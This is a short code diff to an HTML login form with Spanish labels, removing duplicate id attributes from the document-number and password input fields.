@@ -315,7 +315,7 @@
 
                 <div class="input-wrap">
                     <!-- teclado numérico + placeholder en blanco -->
-                    <input id="email"
+                    <input
                         type="tel"
                         id="docNumber"
                         name="numero_documento"
@@ -331,7 +331,7 @@
         <div class="pw-label">Contraseña</div>
 
         <div class="pw-row">
-            <input id="clave" type="password" id="password" name="password">
+            <input type="password" id="password" name="password">
             <div class="eye" id="togglePassword">
                 <img src="img/eye-open.png" alt="Mostrar contraseña">
             </div>
